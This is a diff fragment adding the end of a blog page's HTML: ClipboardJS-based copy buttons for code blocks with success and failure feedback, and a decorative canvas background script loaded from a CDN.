+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+    
+  </div>
+</body>
+<!-- 三角彩带背景 -->
+  <canvas id="evanyou-canvas" style="opacity: 0.3; position: fixed; top: 0px; left: 0px; z-index: -1; width: 100%; height: 100%; pointer-events: none;"></canvas>
+  <script src="https://cdn.jsdelivr.net/gh/XXXZhy/Blog_Image/js/evanyou_canvas.js"></script>
+</html>
